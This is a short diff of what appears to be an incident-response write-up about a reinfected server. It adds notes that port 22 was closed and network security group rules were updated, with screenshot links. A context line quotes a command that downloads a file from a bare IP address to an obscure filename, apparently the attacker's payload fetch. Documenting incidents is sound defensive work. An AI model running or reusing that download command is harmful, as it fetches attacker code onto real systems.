@@ -1008,3 +1008,10 @@ It can delay remediation and leave the system reinfected.
 
 
 curl http://23.160.56.194/r.txt -o sdf3fslsdf15
+
+port 22 closed
+<img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
+
+nsg updates
+<img width="842" height="485" alt="image" src="https://github.com/user-attachments/assets/3dbf8dbf-cd98-4428-b32a-a6ff1cc65354" />
+
